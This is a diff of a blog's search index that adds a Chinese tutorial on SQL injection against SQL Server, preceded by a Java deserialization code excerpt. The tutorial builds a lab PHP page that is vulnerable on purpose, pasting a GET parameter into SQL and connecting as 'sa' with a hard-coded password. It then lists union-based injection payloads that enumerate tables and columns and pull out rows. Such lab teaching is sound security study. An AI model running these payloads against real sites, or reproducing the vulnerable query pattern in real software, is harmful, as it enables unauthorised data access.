-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultReadFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        desc.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">objHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    <span class="comment">//从 ObjectStreamClass 中得到对象的所有 Field 信息</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(f.isUnshared());</span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="literal">null</span>) &#123;</span><br><span class="line">            handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">    		<span class="comment">//将数据保存到对象中去</span></span><br><span class="line">        desc.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CC1链补充</title>
     <url>/2025/02/23/CC1%E9%93%BE%E8%A1%A5%E5%85%85/</url>
     <content><![CDATA[<h1 id="sYR9S">CC1（ysoserial）</h1>
@@ -4630,6 +4483,304 @@ Apache Tomcat在特定配置下，存在反序列化漏洞。
       </categories>
       <tags>
         <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于SqlServer的SQL注入</title>
+    <url>/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="Ie5J5">基于SqlServer的SQL注入</h1>
+<h2 id="YBV7G">前言</h2>
+最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。
+
+<h2 id="o2JTT">SqlServer搭建</h2>
+搭建SqlServer，我们的环境和版本如下：
+
+<ul>
+<li>Windows Server 2012</li>
+<li>SqlServer 2012</li>
+</ul>
+<p>这里的SqlServer环境搭建比较简单，可以参考该链接进行安装 <a href="https://blog.csdn.net/gengkui9897/article/details/89301494">https://blog.csdn.net/gengkui9897/article/details/89301494</a></p>
+<h2 id="vucaF">SqlServer基础</h2>
+Microsoft SQL Server（微软结构化查询语言服务器）也叫Mssql，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库。默认端口号为1433。
+
+<h3 id="ZNxWD">默认数据库</h3>
+安装好SqlServer后，SqlServer数据库中会有6个默认的库，用于维护系统正常运行的**系统数据库**，其中包括四个系统数据库：`master 、model 、msdb 、tempdb` ，和两个实例数据库：`ReportServer、ReportServerTempDB`
+
+<h4 id="kL0Os">系统数据库：</h4>
++ **master：**记录了SqlServer实例的所有系统级消息，包括实例范围的元数据（如登录账号、端点、链接服务器和系统配置设置）
++ msdb：供SqlServer代理服务调度报警和作业记录操作员的使用，保存关于调度报警、作业、操作员等信息
++ model：SqlServer实例上创建的所有数据库的模板
++ tempdb：临时数据库，用于保存临时对象或中间结果集，为数据库的排列等操作提供一个临时的工作空间
+
+<h4 id="qWTUS">实例数据库：</h4>
++ ReportServer：存储SSRS配置部分，报告定义，报告元数据，报告历史，缓存政策，快照，资源，安全设置，加密的数据，调度和提交数据，以及扩展信息
++ ReportServerTempDB：存储中间处理产品，例如缓冲的报告、会话和执行数据等
+
+<h3 id="VGws7">数据库的组成</h3>
+在SqlServer中，数据库是以文件的形式存在的，由文件和文件组组成
+
+<h4 id="cgnEs">文件</h4>
+数据库中的文件基本是分为以下三类：
+
+<ul>
+<li>主要数据文件：存放数据和数据库的初始化信息。每个数据库有且只能有一个主要数据文件<code>.mdf</code>结尾</li>
+<li>次要数据文件：存放除了主要数据文件以外的所有数据文件。次要数据文件不是必须的，可以没有，也可以有多个<code>.ndf</code>结尾</li>
+<li>事务日志文件：存放用户回复数据库的所有文件信息。每个数据库至少有一个日志文件，也可以有多个<code>.ldf</code>结尾</li>
+</ul>
+<h4 id="Eo4Ms">文件组</h4>
+文件组是数据库文件一种逻辑管理单位，他将数据库文件分成不同的文件组，方便对文件的分配和管理，分为两种类型：
+
+<ul>
+<li>主文件组Primary：主要是数据文件和没有明确指派给其他文件组的文件</li>
+<li>用户自定义的文件组：Create DataBase 或者 Alter DataBase语句，FileGroup关键字指定的文件组</li>
+</ul>
+<h4 id="x8Cvj">设计原则</h4>
+SqlServer数据库的设计原则如下
+
+<ul>
+<li>文件只能是一个文件组的成员</li>
+<li>文件或文件组不能由多个数据库使用</li>
+<li>日志不能作为文件组的一部分</li>
+</ul>
+<h3 id="Cm4QN">SqlServer权限</h3>
+sqlserver中的权限控制被分成服务器和数据库两个级别，一个服务器可以包含多个数据库。服务器级别权限可以让我们控制登录、服务器资源操作等等；数据库级别的权限可以让我们对具体的表\视图\数据等数据库内资源进行操作。
+
+<p>在SQL注入的漏洞挖掘中，我们关注的是sqlserver服务器级别的权限，可以把权限简单的归为以下三类：</p>
+<ul>
+<li>**sa权限：**即服务器角色sysadmin。拥有数据库操作，文件管理，命令执行，注册表读取等权限。SQLServer数据库的最高权限 </li>
+<li>**db权限：**文件管理，数据库操作等权限 users-administrators </li>
+<li>**public权限：**数据库操作 guest-users</li>
+</ul>
+<p>如果我们找到一个SqlServer数据库的注入点，可以通过以下命令判断当前用户的权限，查询语句返回1，说明是对应的权限。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">--判断是否是SA权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;sysadmin&#x27;</span>)</span>     </span><br><span class="line">--判断是否是db_owner权限  </span><br><span class="line">select <span class="title function_">is_member</span><span class="params">(<span class="string">&#x27;db_owner&#x27;</span>)</span></span><br><span class="line">--判断是否是<span class="keyword">public</span>权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;public&#x27;</span>)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ybo2c">T-SQL语言</h2>
+在mysql数据库中使用sql语句对数据库进行操作，而在sqlserver数据库中使用的是Transaction-SQL语言，简称T-SQL。T-SQL是在SQL基础之上的一种数据库编程语言。
+
+<p>在这篇文章中，我们基于增删改查和创建数据库去简单了解T-SQL语言</p>
+<h3 id="dfWqj">创建数据库</h3>
+用T-SQL去创建名为SQLDB的数据库，语句如下
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE SQLDB;</span><br></pre></td></tr></table></figure>
+
+<p>如果希望对数据库的文件路径、大小、增长方式等进行配置，可以使用以下命令</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE SQLDB</span><br><span class="line">ON <span class="title function_">PRIMARY</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_data,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_data.mdf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 10MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 100MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">LOG <span class="title function_">ON</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_log,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_log.ldf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 5MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 50MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png"></p>
+<h3 id="waUGu">创建表</h3>
+用T-SQL在SQLDB中新建表，新建表的时候要同时指明字段信息
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 创建一个名为 Employees 的表</span><br><span class="line">CREATE TABLE <span class="title function_">Employees</span> <span class="params">(</span></span><br><span class="line"><span class="params">    EmployeeID INT PRIMARY KEY IDENTITY(<span class="number">1</span>,<span class="number">1</span>)</span>,  -- 员工ID，主键，自增</span><br><span class="line">    FirstName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,           -- 名，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    LastName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,            -- 姓，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    BirthDate DATE NULL,                       -- 出生日期，可以为空</span><br><span class="line">    HireDate DATE NOT NULL,                    -- 入职日期，不能为空</span><br><span class="line">    Email <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">100</span>)</span> UNIQUE,                -- 邮箱，唯一约束，可为空</span><br><span class="line">    Salary <span class="title function_">DECIMAL</span><span class="params">(<span class="number">10</span>, <span class="number">2</span>)</span> CHECK (Salary &gt;= <span class="number">0</span>)  -- 工资，保留两位小数，必须为非负数</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png"></p>
+<h3 id="bGBmK">增删改查</h3>
+<h4 id="Ece5h">插入数据</h4>
+使用Insert向该表中插入数据，可以使用以下命令：
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 向 Employees 表插入一条记录（不包括自增主键 EmployeeID）</span><br><span class="line">INSERT INTO <span class="title function_">Employees</span> <span class="params">(FirstName, LastName, BirthDate, HireDate, Email, Salary)</span></span><br><span class="line">VALUES (</span><br><span class="line">    <span class="string">&#x27;John&#x27;</span>,                -- FirstName</span><br><span class="line">    <span class="string">&#x27;Doe&#x27;</span>,                 -- LastName</span><br><span class="line">    <span class="string">&#x27;1985-06-15&#x27;</span>,          -- BirthDate</span><br><span class="line">    <span class="string">&#x27;2020-01-10&#x27;</span>,          -- HireDate</span><br><span class="line">    <span class="string">&#x27;john.doe@example.com&#x27;</span>,-- Email</span><br><span class="line">    <span class="number">5500.00</span>                -- Salary</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png"></p>
+<h4 id="TGGaN">删除数据</h4>
+使用DELETE删除名为John Doe的员工，命令如下
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 删除名为 John Doe 的员工</span><br><span class="line">DELETE FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;John&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png"></p>
+<h4 id="Xbebe">修改数据</h4>
+修改名为Sean Doe的员工的薪资，修改为`6000.00`
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 修改名为 Sean Doe 的员工薪资为 <span class="number">6000.00</span></span><br><span class="line">UPDATE Employees</span><br><span class="line"><span class="type">SET</span> <span class="variable">Salary</span> <span class="operator">=</span> <span class="number">6000.00</span></span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png"></p>
+<h4 id="egPq9">查询数据</h4>
+查询数据的所使用的语句基本结构如下
+
+<p>后续进行SQL注入时，使用查询语句的频率最高</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SELECT &lt;列名<span class="number">1</span>&gt;, &lt;列名<span class="number">2</span>&gt;, ...</span><br><span class="line">FROM &lt;表名&gt;</span><br><span class="line">[WHERE &lt;筛选条件&gt;]</span><br><span class="line">[GROUP BY &lt;分组列&gt;]</span><br><span class="line">[HAVING &lt;分组后的筛选条件&gt;]</span><br><span class="line">[ORDER BY &lt;排序列&gt; [ASC|DESC]];</span><br></pre></td></tr></table></figure>
+
+<p>这里我们举个例子，可以使用以下 T-SQL 语句来查询名为 Sean Doe 的员工的邮箱和薪资信息</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SELECT Email, Salary</span><br><span class="line">FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png"></p>
+<h2 id="X0Ppb">SqlServer手工注入</h2>
+MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。
+
+<p>对于MSSQL注入点，我们往往最关心的是这个注入点的权限问题，上面讲过，对于MSSQL有以下三个权限：</p>
+<ol>
+<li>sa（最高权限 System）</li>
+<li>db（文件管理、数据库操作等等 user-administrator）</li>
+<li>public（数据库操作权限 guest-users）</li>
+</ol>
+<p>常见搭配为：asp&#x2F;aspx + sqlserver</p>
+<h3 id="qdFxg">环境搭建</h3>
+实验环境：
+
+<ul>
+<li>SqlServer 2012</li>
+<li>phpstudy 2018</li>
+<li>php7.3.4</li>
+</ul>
+<p>首先在数据库中创建数据库，创建数据表和插入输入等操作</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 第一步：创建数据库</span><br><span class="line">USE master;</span><br><span class="line">GO</span><br><span class="line">CREATE DATABASE SchoolDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 第二步：切换到该数据库</span><br><span class="line">USE SchoolDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 第三步：创建学生表</span><br><span class="line">CREATE TABLE <span class="title function_">Students</span> <span class="params">(</span></span><br><span class="line"><span class="params">    StudentID INT PRIMARY KEY NOT NULL,         -- 学号，主键</span></span><br><span class="line"><span class="params">    StudentName NVARCHAR(<span class="number">50</span>)</span> NOT NULL,          -- 姓名</span><br><span class="line">    Age INT NOT NULL,                           -- 年龄</span><br><span class="line">    Class <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL                 -- 所在班级</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 第四步：插入示例学生数据</span><br><span class="line">INSERT INTO <span class="title function_">Students</span> <span class="params">(StudentID, StudentName, Age, Class)</span></span><br><span class="line">VALUES</span><br><span class="line">    (<span class="number">101</span>, <span class="string">&#x27;张三&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;高一1班&#x27;</span>),</span><br><span class="line">    (<span class="number">102</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;高一2班&#x27;</span>),</span><br><span class="line">    (<span class="number">103</span>, <span class="string">&#x27;王五&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;高一1班&#x27;</span>);</span><br><span class="line">GO</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>需要在phpstudy中添加sqlsrv扩展，下载链接<a href="https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases">https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases</a></p>
+<p>因为我这里是php7.3.4版本，我们需要将这两个文件放到<code>C:\phpstudy_pro\Extensions\php\php7.3.4nts\ext</code>目录下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png"></p>
+<p>并在php.ini文件中添加这两行配置</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">extension=php_sqlsrv_63_nts.dll</span><br><span class="line">extension=php_pdo_sqlsrv_73_nts.dll</span><br></pre></td></tr></table></figure>
+
+<p>进入phpinfo界面后，可以看到我们的sqlsrv扩展就已经配置好了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png"></p>
+<p>除此之外，还需要去安装ODBC Driver，链接如下（64位电脑安装64位驱动即可）</p>
+<p><a href="https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip">https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png"></p>
+<p>在网站目录下，创建一个进行sql查询的php文件，源码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">header</span><span class="params">(<span class="string">&quot;Content-Type:text/html;charset=gbk&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库连接</span></span><br><span class="line">$conn = sqlsrv_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, array(</span><br><span class="line">    <span class="string">&#x27;Database&#x27;</span> =&gt; <span class="string">&#x27;SchoolDB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UID&#x27;</span> =&gt; <span class="string">&#x27;sa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PWD&#x27;</span> =&gt; <span class="string">&#x27;@sql123&#x27;</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接失败时输出错误</span></span><br><span class="line"><span class="keyword">if</span> ($conn === <span class="literal">false</span>) &#123;</span><br><span class="line">    var_dump(sqlsrv_errors());</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GET 参数 id（注意：这是一个注入测试场景）</span></span><br><span class="line">$id = $_GET[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接 SQL 语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM Students WHERE StudentID = $id&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;SQL Server injection exercise!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;sql: &quot;</span> . $sql . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line">$result = sqlsrv_query($conn, $sql);</span><br><span class="line">var_dump(sqlsrv_errors());</span><br><span class="line">echo <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">if</span> ($re = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) &#123;</span><br><span class="line">    echo <span class="string">&quot;学号：&quot;</span> . $re[<span class="string">&#x27;StudentID&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;姓名：&quot;</span> . $re[<span class="string">&#x27;StudentName&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;年龄：&quot;</span> . $re[<span class="string">&#x27;Age&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;班级：&quot;</span> . $re[<span class="string">&#x27;Class&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;未找到该学生。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样环境就配置好了，访问<code>http://192.168.41.131:8080/SqlServer.php?id=101</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png"></p>
+<h3 id="lZpDf">常见注入函数和关键字</h3>
+以下是在SQL注入中常用的函数与关键字
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//TOP 对标与MSSQL中的limit，想要输出一条信息 TOP 1 ，输出两条 TOP 2</span><br><span class="line">SELECT TOP 2 StudentName FROM STUDENTS</span><br><span class="line">//@@version 获取版本信息</span><br><span class="line">SELECT @@version</span><br><span class="line">//db_name 获取数据的名字</span><br><span class="line">SELECT db_name()</span><br><span class="line">//OBEJCT_ID 获取表对象ID</span><br><span class="line">OBJECT_ID(&#x27;表名&#x27;)</span><br><span class="line">//col_name table_id表对象ID column_id 列的序号 </span><br><span class="line">COL_NAME ( table_id , column_id )</span><br><span class="line">//convert 把日期转换成新数据类型的通用函数</span><br><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">//stuff 删除字符串中的一部分内容，用另一个字符串替代</span><br><span class="line">stuff( character_expression , start , length , replaceWith_expression )</span><br><span class="line">//len 返回目标字符串的长度</span><br><span class="line">len(select db_name())</span><br><span class="line">//SUBSTRING 用于从字符串中提取指定位置的一部分</span><br><span class="line">SUBSTRING(expression, start, length)</span><br></pre></td></tr></table></figure>
+
+<h3 id="HZao5">注入手法</h3>
+注入手法总的来说和Mysql差不多，差别在于一些函数的区别
+
+<h4 id="JU1ft">联合查询</h4>
+在MSSQL数据库中会存在一个系统自带库-->master，每个库都存在一个系统自带表-->sysobjects。该系统表中对于我们来说有三个字段有用：
+
+<ul>
+<li>NAME：表名信息</li>
+<li>XTYPE： 代表 表的类型，S代表系统自带表，U代表用户创建表</li>
+<li>ID：用于连接syscolumns表</li>
+</ul>
+<p>首先判断目标数据库是否是MSSQL数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and exists(select * from sysobjects) --+</span><br></pre></td></tr></table></figure>
+
+<p>返回正常说明网站使用的数据库是MSSQL</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png"></p>
+<p>联合注入中必要的一步就是判断字段长度，当<code>order by 4</code>回显正常，但<code>order by 5</code>报错时，表明字段长度是3</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 order by 4 --+  正常</span><br><span class="line">SqlServer.php?id=101 order by 5 --+  报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png"></p>
+<p>接下来就是寻找字符串的回显位置（前面select语句查询为空时，才会回显联合查询的东西）</p>
+<p>可以看到，四个回显位均可以利用（正常渗透中，回显位不固定）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,4 --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png"></p>
+<p>查询当前数据库的版本信息和名字</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,db_name(),3,@@version --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png"></p>
+<blockquote>
+<p>此处需要注意，当联合注入的数据和前半部分的数据类型不匹配时，会出现报错</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png"></p>
+</blockquote>
+<p>查询表名，将获取到的数据库名和<code>.dbo.sysobjects</code>进行拼接，通过限制<code>xtype</code>为u，使用<code>TOP 1</code>进行限制，找出第一条查询到的用户创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27;) --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png"></p>
+<p>查询第二条表名数据时，可以使用<code>and name != &#39;第一次输出中的表名&#39;</code>的方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27; and name != &#x27;STUDENTS&#x27;) --+ </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png"></p>
+<p>获取列名，通过col_name、object_id等函数，遍历获取列名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),1) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),2) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),3) from sysobjects)--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png"></p>
+<p>获取数据，这里获取StudentID字段的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101 and StudentID != 102)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png"></p>
+<h4 id="pnSUl">报错注入</h4>
+上面我们说过，MSSQL数据库是强类型语言数据库，当类型不一样时，会报错，配合子查询即可实现报错注入。可以利用的函数有以下这些：
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert() </span><br><span class="line">file_name() </span><br><span class="line">db_name() </span><br><span class="line">col_name() </span><br><span class="line">filegroup_name()</span><br><span class="line">object_name() </span><br><span class="line">schema_name() </span><br><span class="line">type_name() </span><br><span class="line">cast()</span><br></pre></td></tr></table></figure>
+
+<p>这里我们使用convert函数作为演示，convert函数语法如下</p>
